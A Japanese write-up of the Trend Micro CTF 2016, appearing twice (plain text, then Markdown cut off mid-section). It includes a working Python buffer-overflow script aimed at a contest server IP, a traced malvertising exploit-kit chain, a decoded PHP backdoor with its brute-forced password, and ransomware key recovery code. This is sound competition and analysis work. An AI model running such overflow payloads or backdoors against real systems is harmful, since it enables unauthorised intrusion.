{"context": "Trend Micro\u4e3b\u50ac\u306eCTF\u3002\u53bb\u5e74\u306f\u30a2\u30b8\u30a2\u5730\u57df\u9650\u5b9a\u3060\u3063\u305f\u3051\u3069\u3001\u4eca\u5e74\u306f\u5168\u4e16\u754c\u5bfe\u8c61\u3089\u3057\u3044\u3002\nhttp://www.trendmicro.co.jp/jp/sp/ctf2016_jp/\n\u307c\u3063\u3061\u30c1\u30fc\u30e0superflip\u306f\u300120\u4f4d\u3002\u6642\u300510\u4f4d\u4ee5\u5185\u306b\u5165\u308c\u305f\u3051\u3069\u3001\u6c7a\u52dd\u306e\u58c1\u306f\u539a\u3044\u3002\n\n\nAnalysis - Offensive\n\u653b\u6483\u3002\n\n100\nHTML Applications\u3002\u5b9f\u884c\u53ef\u80fd\u30d5\u30a1\u30a4\u30eb\u3063\u307d\u3044\u30a2\u30a4\u30b3\u30f3\u3060\u3051\u3069\u3001\u4e2d\u3092\u958b\u3051\u3070HTML\u3068JavaScript\u3002\n\n\u5165\u529b\u3055\u308c\u305f\u767b\u9332\u9375\u30923\u500b\u306e\u6587\u5b57\u5217\u306b\u5206\u3051\u3066\u3001\u305d\u308c\u305e\u308c\u306eMD5\u3092\u8a08\u7b97\u3057\u3066\u4e00\u81f4\u3057\u3066\u3044\u308c\u3070\u901a\u308b\u3002\na === ka.replace(/6/g,'2').replace(/b/g,'a').replace(/d/g,'4') \u3068\u3044\u3046\u30b3\u30fc\u30c9\u3092\u898b\u3066\u3001\u300c\u60c5\u5831\u304c\u843d\u3061\u3066\u3044\u308b\u304b\u3089\u81ea\u5206\u3067MD5\u3092\u63a2\u7d22\u3059\u308b\u30eb\u30fc\u30c1\u30f3\u3092\u66f8\u304b\u306a\u3044\u3068\u3044\u3051\u306a\u3044\u3002\u9762\u5012\u3060\u306a\u2026\u2026\u300d\u3068\u601d\u3063\u305f\u3051\u3069\u3001\u5165\u529b\u3057\u305f\u6587\u5b57\u5217\u306eMD5\u306fka\u3067\u306f\u306a\u304fa\u3060\u3063\u305f\u3002\u308f\u3056\u308f\u3056MD5\u306e\u51fa\u73fe\u6587\u5b57\u7a2e\u304c\u5c11\u306a\u3044\u6587\u5b57\u5217\u3092\u63a2\u3057\u305f\u306e\u304b\u3002\nTMCTF{q6r4dy5ei2na1twm3}\n\n200\n\u30d0\u30c3\u30d5\u30a1\u30fc\u30aa\u30fc\u30d0\u30fc\u30d5\u30ed\u30fc\u653b\u6483\u3002\u30d0\u30c3\u30d5\u30a1\u306e\u76f4\u5f8c\u306e\u5909\u6570\u3092\u66f8\u304d\u63db\u3048\u308b\u3060\u3051\u3067\u3001\u3068\u3066\u3082\u7c21\u5358\u3002\u624b\u5143\u3067\u8a66\u3059\u3053\u3068\u3082\u306a\u304f\u3001\u4e00\u767a\u3067\u6210\u529f\u3057\u305f\u3002\nfrom socket import *\nfrom struct import *\n\ns = socket(AF_INET, SOCK_STREAM)\ns.connect((\"52.197.128.90\", 80))\n\nprint s.recv(8)\n\ns.send(\"a\"*1024+pack(\"<I\", (0x7eaf^0xc0fe)<<16|(0xdae4^0x1a1a)))\n\nprint s.recv(5)\nprint s.recv(100)\n\nTMCTF{e8eb549f48fb7}\n\n300\nWindows\u30a2\u30d7\u30ea\u306e\u89e3\u6790\u3002\u554f\u984c\u30d5\u30a1\u30a4\u30eb\u306f\u3001temp\u30d5\u30a9\u30eb\u30c0\u306b\u30d5\u30a1\u30a4\u30eb\u3092\u66f8\u304d\u51fa\u3057\u3066\u5b9f\u884c\u3059\u308b\u3088\u3046\u306b\u306a\u3063\u3066\u3044\u308b\u306e\u3067\u3001\u9069\u5f53\u306a\u3068\u3053\u308d\u3067\u6b62\u3081\u3066\u3053\u306e\u30d5\u30a1\u30a4\u30eb\u3092\u6301\u3063\u3066\u304f\u308b\u3002\n\u30b9\u30ec\u30c3\u30c9\u3092\u3044\u304f\u3064\u304b\u4f5c\u3063\u3066\u3001\u30b3\u30f3\u30d4\u30e5\u30fc\u30bf\u540d\u3092\u53d6\u5f97\u3057\u305f\u308a\u3068\u304b\u8272\u3005\u3084\u3063\u3066\u3044\u308b\u3002\u51e6\u7406\u304c\u8ffd\u3044\u5207\u308c\u3066\u3044\u306a\u3044\u3051\u3069\u3001\u30a8\u30e9\u30fc\u3067\u7d42\u4e86\u3059\u308b\u3068\u3053\u308d\u3092\u6f70\u3057\u305f\u308a\u3057\u3066\u3044\u305f\u3089\u3001\u856b\u30fbnter{Thread-Traveler}\u3068\u8868\u793a\u3055\u308c\u305f\u3002\nTMCTF{Thread-Traveler}\n\n400\n\u30a6\u30a7\u30d6\u30b5\u30a4\u30c8\u3092\u95b2\u89a7\u3057\u3066\u3044\u305f\u3089\u3001suspicious\u306a\u30d5\u30a1\u30a4\u30eb\u304c\u30c0\u30a6\u30f3\u30ed\u30fc\u30c9\u3055\u308c\u305f\u3089\u3057\u3044\u3002\n\n\u30b5\u30a4\u30c8\u306eads.js\u304cGIF\u753b\u50cf\u3092\u8aad\u307f\u8fbc\u3093\u3067\u3001\u57cb\u3081\u8fbc\u307e\u308c\u305fJavaScript\u3092\u30da\u30fc\u30b8\u306b\u8ffd\u52a0\u3059\u308b\n\u3053\u306e\u30b9\u30af\u30ea\u30d7\u30c8\u3067<iframe>\u3092\u66f8\u304d\u51fa\u3059\n\u8aad\u307f\u8fbc\u307e\u308c\u305f\u30da\u30fc\u30b8\u5185\u3067\u30b9\u30af\u30ea\u30d7\u30c8\u3067<object>\u3092\u66f8\u3044\u3066\u3001swf\u30d5\u30a1\u30a4\u30eb\u3092\u8aad\u307f\u8fbc\u3080\n\u3053\u306eswf\u306e\u4e2d\u3067\u5225\u306eswf\u3092\u5fa9\u53f7\u3057\u3066\u30da\u30fc\u30b8\u306b\u66f8\u304d\u51fa\u3059\n\u5225\u306eswf\u306e\u4e2d\u3067\u65e5\u6642\u306e\u6761\u4ef6\u304c\u63c3\u3046\u3068\uff08\uff1f\uff09JavaScript\u304c\u5b9f\u884c\u3055\u308c\u308b\nJavaScript\u4e2d\u3067\u753b\u50cf\u3092\u5fa9\u53f7\u3057\u3066<img>\u3067\u66f8\u304d\u51fa\u3059\u3002\u305f\u3060\u3057\u3001width=0 height=0\n\n\n\u3068\u3044\u3046\u6d41\u308c\u306b\u306a\u3063\u3066\u3044\u305f\u3002\u771f\u9762\u76ee\u306b\u51e6\u7406\u3092\u8ffd\u3063\u305f\u3051\u3069\u3001\u4e0a\u624b\u3044\u3053\u3068\u5b9f\u884c\u3055\u305b\u305f\u65b9\u304c\u697d\u3060\u3063\u305f\u304b\u3082\u3057\u308c\u306a\u3044\u3002\n\u4eca\u307e\u3067\u3001Flash\u30d5\u30a1\u30a4\u30eb\u3092\u89e3\u6790\u3057\u3088\u3046\u3068\u601d\u3063\u3066\u3044\u304f\u3064\u304b\u30bd\u30d5\u30c8\u3092\u8a66\u3057\u3066\u3082\u3001\u3061\u3083\u3093\u3068\u52d5\u3044\u3066\u304f\u308c\u306a\u304f\u3066\u56f0\u3063\u3066\u3044\u305f\u304c\u3001\u2193\u306e\u30bd\u30d5\u30c8\u3067\u3059\u3054\u304f\u7dba\u9e97\u306b\u30c7\u30b3\u30f3\u30d1\u30a4\u30eb\u3067\u304d\u305f\u3002\u4eca\u56de\u306e\u30b3\u30f3\u30c6\u30b9\u30c8\u3067\u4e00\u756a\u306e\u53ce\u7a6b\u3002\nJPEXS Free Flash Decompiler - Opensource SWF decompiler and editor\n\nTMCTF{M4LV3RT1S1NG-EK}\n\nAnalysis - defensive\n\u9632\u5fa1\u3002\n\n100\n\u6697\u53f7\u5316\u3055\u308c\u305fPHP\u30d5\u30a1\u30a4\u30eb\u3002\u6697\u53f7\u5316\u3068\u306f\u8a00\u3063\u3066\u3082\u3001'ev'.'al'\u3092'echo'\u306b\u3067\u3082\u5909\u3048\u308c\u3070\u8aad\u3081\u308b\u3002\u51e6\u7406\u5185\u5bb9\u306f\u30d0\u30c3\u30af\u30c9\u30a2\u3002\u30d1\u30b9\u30ef\u30fc\u30c9\u304c\u5fc5\u8981\u3067\u3001sha1(md5($post))\u304c\u57cb\u3081\u8fbc\u307e\u308c\u305f\u5024\u306b\u306a\u308b\u304b\u30c1\u30a7\u30c3\u30af\u3057\u3066\u3044\u308b\u3002\u7dcf\u5f53\u305f\u308a\u3067\u63a2\u7d22\u3057\u3066\u307f\u305f\u3068\u3053\u308d\u3001h4ck\u3060\u3063\u305f\u3002\n\u3053\u306e\u30b9\u30af\u30ea\u30d7\u30c8\u304c\u904b\u55b6\u306e\u30b5\u30fc\u30d0\u30fc\u306b\u7f6e\u3044\u3066\u3042\u308b\u308f\u3051\u3067\u3082\u306a\u3044\u3057\u3001\u3069\u3046\u3057\u308d\u3068\u2026\u2026\u3068\u3057\u3070\u3089\u304f\u60a9\u3093\u3067\u3044\u305f\u3051\u3069\u3001\u30da\u30fc\u30b8\u5185\u306e\u9375\u306e\u753b\u50cf\u306b\u30b3\u30e1\u30f3\u30c8\u304c\u3042\u3063\u305f\u3002\n45786966000049492a000800000002000f010200050000002600000010010200400000002c000000000000002f2e2a2f65006576616c286261736536345f6465636f646528225a574e6f6279416e5a6d78685a7942706379427a614745784b48426863334e3362334a6b4b5363372229293b\n\u3000\u2193\neval(base64_decode(\"ZWNobyAnZmxhZyBpcyBzaGExKHBhc3N3b3JkKSc7\"));\n\u3000\u2193\necho 'flag is sha1(password)';\npassword\u306fh4ck\u306e\u3053\u3068\u3002\nTMCTF{e17e98788d6b4ac922b2df100ef9398ae0f229ad}\n\n400\n\u30e9\u30f3\u30b5\u30e0\u30a6\u30a7\u30a2\u304c\u6697\u53f7\u5316\u3057\u305f\u30d5\u30a1\u30a4\u30eb\u3092\u5fa9\u53f7\u3057\u3066\u304f\u308c\u3068\u3044\u3046\u554f\u984c\u3002\nOffensive 300\u3068\u540c\u3058\u3088\u3046\u306b\u5b9f\u969b\u306b\u5b9f\u884c\u3055\u308c\u3066\u3044\u308b\u30d5\u30a1\u30a4\u30eb\u3092\u30b3\u30d4\u30fc\u3059\u308b\u3002py2exe\u3067\u751f\u6210\u3055\u308c\u305f\u30d7\u30ed\u30b0\u30e9\u30e0\u306a\u306e\u3067\u3001unpy2exe\u3067pyc\u3092\u53d6\u308a\u51fa\u3057\u3001uncompyle2\u3067py\u306b\u623b\u3059\u3002\u8b58\u5225\u5b50\u304c\u96e3\u8aad\u5316\u3055\u308c\u3066\u3044\u308b\u306e\u3067\u3001\u9069\u5f53\u306b\u7f6e\u63db\u3059\u308b\u3002\n\u6697\u53f7\u5316\u306b\u4f7f\u308f\u308c\u3066\u3044\u308b\u9375\u304c2\u500b\u3042\u308b\u3002\u93751\u306f\u3001\ntrend = 'TrEndMicRo'\nkey = ''\nfor i in range(5):\n    key = key + random.choice(trend)\nkey = '!' + key + key + key + key + key + key + '!'\n\n\u3067\u3001\u30e9\u30f3\u30c0\u30e0\u306b\u751f\u6210\u3055\u308c\u3066\u3044\u308b\u300210\u4e07\u901a\u308a\u3002\u93752\u306f\u4eca\u65e5\u306e8\u300120160731\u3068\u304b\u3002\u4e21\u65b9\u306e\u7d44\u307f\u5408\u308f\u305b\u306f\u7121\u7406\u3060\u304c\u3001\u7247\u65b9\u306a\u3089\u5168\u63a2\u7d22\u3067\u304d\u308b\u3002\n\u6697\u53f7\u5316\u306e\u6d41\u308c\u306f\u3001\n\u93751\u3067AES \u2192 Base64 \u2192 \u93752\u3067RC4\n\u309210\u56de\u7e70\u308a\u8fd4\u3057\u3066\u3044\u308b\u3002Base64\u304c\u3042\u308b\u306e\u3067\u3001\u6697\u53f7\u6587\u3092\u93752\u3067\u5fa9\u53f7\u3057\u305f\u3068\u304d\u306b\u306fBase64\u3067\u5fa9\u53f7\u3067\u304d\u308b\u6587\u5b57\u5217\u306b\u306a\u3063\u3066\u3044\u308b\u306f\u305a\u3002Base64\u304c\u7121\u3051\u308c\u3070\u3001AES\u306e\u30d1\u30c7\u30a3\u30f3\u30b0\u306a\u3069\u304c\u4f7f\u3048\u305f\u3060\u308d\u3046\u304b\u3002\u6697\u53f7\u3092\u8907\u6570\u7d44\u307f\u5408\u308f\u305b\u3066\u5f37\u5ea6\u30a2\u30c3\u30d7\ud83d\udcaa\u306a\u3069\u3068\u8003\u3048\u305a\u306b\u3001\u6697\u53f7\u306f\u7d20\u76f4\u306b\u4f7f\u3044\u307e\u3057\u3087\u3046\u3068\u3002\nfrom itertools import *\nfrom Crypto.Cipher import AES\n\nkey1 = \"!MdEccMdEccMdEccMdEccMdEccMdEcc!\"\nkey2 = \"20163006\"\n\nfor i in range(10):\n    data = ilililililililililililililil(data, key2)\n    data = data.decode(\"base64\")\n\n    salt = data[:16]\n    data = data[16:]\n    aes = AES.new(key1, AES.MODE_CBC, salt)\n    data = aes.decrypt(data)\n    data = data[:-ord(data[-1])]\n\nopen(\"dec.png\", \"wb\").write(data)\n\n\u753b\u50cf\u306b\u306f\u3001Flag is a MD5 of original this file.\u3068\u66f8\u3044\u3066\u3042\u308b\u3002dec.png\u306eMD5\u3067\u901a\u3089\u306a\u304f\u3066\u3069\u306e\u30d5\u30a1\u30a4\u30eb\u306e\u3053\u3068\u304b\u3068\u601d\u3063\u305f\u3051\u3069\u3001MD5\u3092\u5927\u6587\u5b57\u306b\u3057\u305f\u3089\u901a\u3063\u305f\u3002\nTMCTF{8457F2FDA0BF2BF1DB76121ED133B46E}\n\nForensic\n1\u554f\u3082\u89e3\u3051\u3066\u3044\u306a\u3044(\u00b4\u30fb\u03c9\u30fb`)\n\nReversing\n1\u554f\u3082\u89e3\u3051\u3066\u3044\u306a\u3044(\u00b4\uff1b\u03c9\uff1b`)\n\nSCADA\n1\u554f\u3082\u89e3\u3051\u3066\u3044\u306a\u3044\uff61\uff65\uff9f\uff65(\uff89\u0414`)\uff65\uff9f\uff65\uff61\n\nSCADA\uff08Supervisory Control And Data Acquisition \u306e\u7565\uff09\u306f\u3001\u7523\u696d\u5236\u5fa1\u30b7\u30b9\u30c6\u30e0\u306e\u4e00\u7a2e\u3067\u3042\u308a\u3001\u30b3\u30f3\u30d4\u30e5\u30fc\u30bf\u306b\u3088\u308b\u30b7\u30b9\u30c6\u30e0\u76e3\u8996\u3068\u30d7\u30ed\u30bb\u30b9\u5236\u5fa1\u3092\u884c\u3046\u3002\u5bfe\u8c61\u30d7\u30ed\u30bb\u30b9\u306f\u3001\u4ee5\u4e0b\u306e\u3088\u3046\u306a\u751f\u7523\u5de5\u7a0b\u3084\u30a4\u30f3\u30d5\u30e9\u3084\u8a2d\u5099\u306b\u95a2\u3059\u308b\u3082\u306e\u3067\u3042\u308b\u3002\n\nhttps://ja.wikipedia.org/wiki/SCADA\n\u60c5\u5831\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u3067\u4eca\u4e00\u756a\u71b1\u3044\u5206\u91ce\u3060\u308d\u3046\u304b\u3002\n\nMisc (IoT and Network)\n\n100\nIPsec\u306e\u5fa9\u53f7\u3002\u9014\u4e2d\u5e73\u6587\u3067\u9375\u3092\u898b\u3066\u3044\u308b\u306e\u3067\u3001\u3053\u306e\u30b5\u30a4\u30c8\u306eESP\u306e\u624b\u9806\u3092\u305d\u306e\u307e\u307e\u3084\u308b\u3060\u3051\u3002HTTP\u3067\u30d5\u30e9\u30b0\u306e\u66f8\u304b\u308c\u305f\u753b\u50cf\u3092\u53d6\u5f97\u3057\u3066\u3044\u308b\u3002\nIPsec(ISAKMP\u3001ESP)\u306e\u5fa9\u53f7\u5316\u624b\u9806 - sai\u2019s diary\nTMCTF{GO_FOR_THE_CL}\n\n200\nModemSettings.txt\u3068\u3044\u3046\u30d5\u30a1\u30a4\u30eb\u304c\u6e21\u3055\u308c\u3066\u3001\u5bfe\u5fdc\u3057\u3066\u3044\u308bLTE\u30d0\u30f3\u30c9\u306f\u4f55\u304b\uff1f\u3068\u3044\u3046\u554f\u984c\u3002\u3053\u306e\u30b5\u30a4\u30c8\u306e\u901a\u308a\u30026828 (0x1AAC)\u306e\u30d6\u30ed\u30c3\u30af\u3092\u30ea\u30c8\u30eb\u30a8\u30f3\u30c7\u30a3\u30a2\u30f3\u3067\u8aad\u3093\u3067\u3001\u4e0b\u4f4d\u30d3\u30c3\u30c8\u304b\u3089\u9806\u306b1, 2, \u2026\u3089\u3057\u3044\u3002\nAndroid\u7aef\u672b\u306e\u5bfe\u5fdc\u30d0\u30f3\u30c9\u306e\u5909\u66f4\u306b\u3064\u3044\u3066(NTTdocomo\u30d7\u30e9\u30b9\u30a8\u30ea\u30a2\u5bfe\u5fdc\u306a\u3069) | AndMem\nTMCTF{1,2,3,4,5,6,7,8,9,11,12,13,17,18,19,20,21,25,26}\n\n400\n\u53bb\u5e74\u306b\u5f15\u304d\u7d9a\u304d\u30d6\u30e9\u30c3\u30af\u30b8\u30e3\u30c3\u30af\u3002\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u306e\u554f\u984c\u3063\u307d\u3044\u3057\u3001\u305d\u308c\u306a\u3089\u89e3\u3051\u308b\u3060\u308d\u3068\u601d\u3063\u3066\u6700\u5f8c\u306e\u307b\u3046\u306b\u53d6\u308a\u7d44\u3093\u3067\u3044\u305f\u3002\u30d6\u30e9\u30c3\u30af\u30b8\u30e3\u30c3\u30af\u306b27\u9023\u52dd\u3057\u308d\u3068\u3002\u30b5\u30fc\u30d0\u30fc\u3067\u52d5\u3044\u3066\u3044\u308b\u308f\u3051\u3067\u306f\u306a\u304f\u624b\u5143\u306b\u5168\u3066\u306e\u30d5\u30a1\u30a4\u30eb\u304c\u3042\u308b\u3057\u3001\u30d5\u30e9\u30b0\u306f27\u9023\u52dd\u3057\u305f\u3068\u304d\u306e\u6b8b\u308a\u30ab\u30fc\u30c9\u304b\u3089\u8a08\u7b97\u3057\u3066\u3044\u308b\u3057\u3067\u3001\u610f\u5473\u304c\u5206\u304b\u3089\u305a\u3001\u8272\u3005\u60a9\u3093\u3067\u7d42\u4e86\u3002\n\n27\u9023\u52dd\u3067\u304d\u308b\u3088\u3046\u306a\u6642\u523b\u3092\u898b\u3064\u3051\u51fa\u305b\u3068\u3044\u3046\u554f\u984c\u3060\u3063\u305f\u3089\u3057\u3044\u3002\u65b9\u91dd\u3055\u3048\u5206\u304b\u308c\u3070\u89e3\u3051\u305d\u3046\u306a\u306e\u3067\u3001\u3042\u3068\u3067\u6311\u6226\u3057\u3066\u307f\u3088\u3046\u3002\nTrend Micro\u4e3b\u50ac\u306eCTF\u3002\u53bb\u5e74\u306f\u30a2\u30b8\u30a2\u5730\u57df\u9650\u5b9a\u3060\u3063\u305f\u3051\u3069\u3001\u4eca\u5e74\u306f\u5168\u4e16\u754c\u5bfe\u8c61\u3089\u3057\u3044\u3002\nhttp://www.trendmicro.co.jp/jp/sp/ctf2016_jp/\n\n\u307c\u3063\u3061\u30c1\u30fc\u30e0superflip\u306f\u300120\u4f4d\u3002\u6642\u300510\u4f4d\u4ee5\u5185\u306b\u5165\u308c\u305f\u3051\u3069\u3001\u6c7a\u52dd\u306e\u58c1\u306f\u539a\u3044\u3002\n\n<a href=\"https://qiita-image-store.s3.amazonaws.com/0/25276/8750cf26-9464-92b6-49b0-cc2b5237ef0d.png\"><img src=\"https://qiita-image-store.s3.amazonaws.com/0/25276/8750cf26-9464-92b6-49b0-cc2b5237ef0d.png\" width=\"480\"></a>\n\n# Analysis - Offensive\n\n\u653b\u6483\u3002\n\n## 100 \n\nHTML Applications\u3002\u5b9f\u884c\u53ef\u80fd\u30d5\u30a1\u30a4\u30eb\u3063\u307d\u3044\u30a2\u30a4\u30b3\u30f3\u3060\u3051\u3069\u3001\u4e2d\u3092\u958b\u3051\u3070HTML\u3068JavaScript\u3002\n\n![image](https://qiita-image-store.s3.amazonaws.com/0/25276/5fbc64dc-b638-0b0b-5cbe-d3db9a0afb58.png)\n\n\u5165\u529b\u3055\u308c\u305f\u767b\u9332\u9375\u30923\u500b\u306e\u6587\u5b57\u5217\u306b\u5206\u3051\u3066\u3001\u305d\u308c\u305e\u308c\u306eMD5\u3092\u8a08\u7b97\u3057\u3066\u4e00\u81f4\u3057\u3066\u3044\u308c\u3070\u901a\u308b\u3002\n\n`a === ka.replace(/6/g,'2').replace(/b/g,'a').replace(/d/g,'4')` \u3068\u3044\u3046\u30b3\u30fc\u30c9\u3092\u898b\u3066\u3001\u300c\u60c5\u5831\u304c\u843d\u3061\u3066\u3044\u308b\u304b\u3089\u81ea\u5206\u3067MD5\u3092\u63a2\u7d22\u3059\u308b\u30eb\u30fc\u30c1\u30f3\u3092\u66f8\u304b\u306a\u3044\u3068\u3044\u3051\u306a\u3044\u3002\u9762\u5012\u3060\u306a\u2026\u2026\u300d\u3068\u601d\u3063\u305f\u3051\u3069\u3001\u5165\u529b\u3057\u305f\u6587\u5b57\u5217\u306eMD5\u306f`ka`\u3067\u306f\u306a\u304f`a`\u3060\u3063\u305f\u3002\u308f\u3056\u308f\u3056MD5\u306e\u51fa\u73fe\u6587\u5b57\u7a2e\u304c\u5c11\u306a\u3044\u6587\u5b57\u5217\u3092\u63a2\u3057\u305f\u306e\u304b\u3002\n\n`TMCTF{q6r4dy5ei2na1twm3}`\n\n## 200\n\n\u30d0\u30c3\u30d5\u30a1\u30fc\u30aa\u30fc\u30d0\u30fc\u30d5\u30ed\u30fc\u653b\u6483\u3002\u30d0\u30c3\u30d5\u30a1\u306e\u76f4\u5f8c\u306e\u5909\u6570\u3092\u66f8\u304d\u63db\u3048\u308b\u3060\u3051\u3067\u3001\u3068\u3066\u3082\u7c21\u5358\u3002\u624b\u5143\u3067\u8a66\u3059\u3053\u3068\u3082\u306a\u304f\u3001\u4e00\u767a\u3067\u6210\u529f\u3057\u305f\u3002\n\n```py\nfrom socket import *\nfrom struct import *\n\ns = socket(AF_INET, SOCK_STREAM)\ns.connect((\"52.197.128.90\", 80))\n\nprint s.recv(8)\n\ns.send(\"a\"*1024+pack(\"<I\", (0x7eaf^0xc0fe)<<16|(0xdae4^0x1a1a)))\n\nprint s.recv(5)\nprint s.recv(100)\n```\n\n`TMCTF{e8eb549f48fb7}`\n\n## 300\n\nWindows\u30a2\u30d7\u30ea\u306e\u89e3\u6790\u3002\u554f\u984c\u30d5\u30a1\u30a4\u30eb\u306f\u3001temp\u30d5\u30a9\u30eb\u30c0\u306b\u30d5\u30a1\u30a4\u30eb\u3092\u66f8\u304d\u51fa\u3057\u3066\u5b9f\u884c\u3059\u308b\u3088\u3046\u306b\u306a\u3063\u3066\u3044\u308b\u306e\u3067\u3001\u9069\u5f53\u306a\u3068\u3053\u308d\u3067\u6b62\u3081\u3066\u3053\u306e\u30d5\u30a1\u30a4\u30eb\u3092\u6301\u3063\u3066\u304f\u308b\u3002\n\u30b9\u30ec\u30c3\u30c9\u3092\u3044\u304f\u3064\u304b\u4f5c\u3063\u3066\u3001\u30b3\u30f3\u30d4\u30e5\u30fc\u30bf\u540d\u3092\u53d6\u5f97\u3057\u305f\u308a\u3068\u304b\u8272\u3005\u3084\u3063\u3066\u3044\u308b\u3002\u51e6\u7406\u304c\u8ffd\u3044\u5207\u308c\u3066\u3044\u306a\u3044\u3051\u3069\u3001\u30a8\u30e9\u30fc\u3067\u7d42\u4e86\u3059\u308b\u3068\u3053\u308d\u3092\u6f70\u3057\u305f\u308a\u3057\u3066\u3044\u305f\u3089\u3001`\u856b\u30fbnter{Thread-Traveler}`\u3068\u8868\u793a\u3055\u308c\u305f\u3002\n\n`TMCTF{Thread-Traveler}`\n\n## 400\n\n\u30a6\u30a7\u30d6\u30b5\u30a4\u30c8\u3092\u95b2\u89a7\u3057\u3066\u3044\u305f\u3089\u3001suspicious\u306a\u30d5\u30a1\u30a4\u30eb\u304c\u30c0\u30a6\u30f3\u30ed\u30fc\u30c9\u3055\u308c\u305f\u3089\u3057\u3044\u3002\n\n1. \u30b5\u30a4\u30c8\u306eads.js\u304cGIF\u753b\u50cf\u3092\u8aad\u307f\u8fbc\u3093\u3067\u3001\u57cb\u3081\u8fbc\u307e\u308c\u305fJavaScript\u3092\u30da\u30fc\u30b8\u306b\u8ffd\u52a0\u3059\u308b\n2. \u3053\u306e\u30b9\u30af\u30ea\u30d7\u30c8\u3067`<iframe>`\u3092\u66f8\u304d\u51fa\u3059\n3. \u8aad\u307f\u8fbc\u307e\u308c\u305f\u30da\u30fc\u30b8\u5185\u3067\u30b9\u30af\u30ea\u30d7\u30c8\u3067`<object>`\u3092\u66f8\u3044\u3066\u3001swf\u30d5\u30a1\u30a4\u30eb\u3092\u8aad\u307f\u8fbc\u3080\n4. \u3053\u306eswf\u306e\u4e2d\u3067\u5225\u306eswf\u3092\u5fa9\u53f7\u3057\u3066\u30da\u30fc\u30b8\u306b\u66f8\u304d\u51fa\u3059\n5. \u5225\u306eswf\u306e\u4e2d\u3067\u65e5\u6642\u306e\u6761\u4ef6\u304c\u63c3\u3046\u3068\uff08\uff1f\uff09JavaScript\u304c\u5b9f\u884c\u3055\u308c\u308b\n6. JavaScript\u4e2d\u3067\u753b\u50cf\u3092\u5fa9\u53f7\u3057\u3066`<img>`\u3067\u66f8\u304d\u51fa\u3059\u3002\u305f\u3060\u3057\u3001`width=0 height=0`\n\n\u3068\u3044\u3046\u6d41\u308c\u306b\u306a\u3063\u3066\u3044\u305f\u3002\u771f\u9762\u76ee\u306b\u51e6\u7406\u3092\u8ffd\u3063\u305f\u3051\u3069\u3001\u4e0a\u624b\u3044\u3053\u3068\u5b9f\u884c\u3055\u305b\u305f\u65b9\u304c\u697d\u3060\u3063\u305f\u304b\u3082\u3057\u308c\u306a\u3044\u3002\n\n\u4eca\u307e\u3067\u3001Flash\u30d5\u30a1\u30a4\u30eb\u3092\u89e3\u6790\u3057\u3088\u3046\u3068\u601d\u3063\u3066\u3044\u304f\u3064\u304b\u30bd\u30d5\u30c8\u3092\u8a66\u3057\u3066\u3082\u3001\u3061\u3083\u3093\u3068\u52d5\u3044\u3066\u304f\u308c\u306a\u304f\u3066\u56f0\u3063\u3066\u3044\u305f\u304c\u3001\u2193\u306e\u30bd\u30d5\u30c8\u3067\u3059\u3054\u304f\u7dba\u9e97\u306b\u30c7\u30b3\u30f3\u30d1\u30a4\u30eb\u3067\u304d\u305f\u3002\u4eca\u56de\u306e\u30b3\u30f3\u30c6\u30b9\u30c8\u3067\u4e00\u756a\u306e\u53ce\u7a6b\u3002\n\n[JPEXS Free Flash Decompiler - Opensource SWF decompiler and editor](https://www.free-decompiler.com/flash/)\n\n<a href=\"https://qiita-image-store.s3.amazonaws.com/0/25276/27d8067b-cef8-bca4-6927-b23b5fdcb4da.png\"><img src=\"https://qiita-image-store.s3.amazonaws.com/0/25276/27d8067b-cef8-bca4-6927-b23b5fdcb4da.png\" width=\"480\"></a>\n\n`TMCTF{M4LV3RT1S1NG-EK}`\n\n# Analysis - defensive\n\n\u9632\u5fa1\u3002\n\n## 100\n\n\u6697\u53f7\u5316\u3055\u308c\u305fPHP\u30d5\u30a1\u30a4\u30eb\u3002\u6697\u53f7\u5316\u3068\u306f\u8a00\u3063\u3066\u3082\u3001`'ev'.'al'`\u3092`'echo'`\u306b\u3067\u3082\u5909\u3048\u308c\u3070\u8aad\u3081\u308b\u3002\u51e6\u7406\u5185\u5bb9\u306f\u30d0\u30c3\u30af\u30c9\u30a2\u3002\u30d1\u30b9\u30ef\u30fc\u30c9\u304c\u5fc5\u8981\u3067\u3001`sha1(md5($post))`\u304c\u57cb\u3081\u8fbc\u307e\u308c\u305f\u5024\u306b\u306a\u308b\u304b\u30c1\u30a7\u30c3\u30af\u3057\u3066\u3044\u308b\u3002\u7dcf\u5f53\u305f\u308a\u3067\u63a2\u7d22\u3057\u3066\u307f\u305f\u3068\u3053\u308d\u3001`h4ck`\u3060\u3063\u305f\u3002\n\u3053\u306e\u30b9\u30af\u30ea\u30d7\u30c8\u304c\u904b\u55b6\u306e\u30b5\u30fc\u30d0\u30fc\u306b\u7f6e\u3044\u3066\u3042\u308b\u308f\u3051\u3067\u3082\u306a\u3044\u3057\u3001\u3069\u3046\u3057\u308d\u3068\u2026\u2026\u3068\u3057\u3070\u3089\u304f\u60a9\u3093\u3067\u3044\u305f\u3051\u3069\u3001\u30da\u30fc\u30b8\u5185\u306e\u9375\u306e\u753b\u50cf\u306b\u30b3\u30e1\u30f3\u30c8\u304c\u3042\u3063\u305f\u3002\n\n`45786966000049492a000800000002000f010200050000002600000010010200400000002c000000000000002f2e2a2f65006576616c286261736536345f6465636f646528225a574e6f6279416e5a6d78685a7942706379427a614745784b48426863334e3362334a6b4b5363372229293b`\n\u3000\u2193\n`eval(base64_decode(\"ZWNobyAnZmxhZyBpcyBzaGExKHBhc3N3b3JkKSc7\"));`\n\u3000\u2193\n`echo 'flag is sha1(password)';`\n\npassword\u306f`h4ck`\u306e\u3053\u3068\u3002\n\n`TMCTF{e17e98788d6b4ac922b2df100ef9398ae0f229ad}`\n\n## 400\n\n\u30e9\u30f3\u30b5\u30e0\u30a6\u30a7\u30a2\u304c\u6697\u53f7\u5316\u3057\u305f\u30d5\u30a1\u30a4\u30eb\u3092\u5fa9\u53f7\u3057\u3066\u304f\u308c\u3068\u3044\u3046\u554f\u984c\u3002\nOffensive 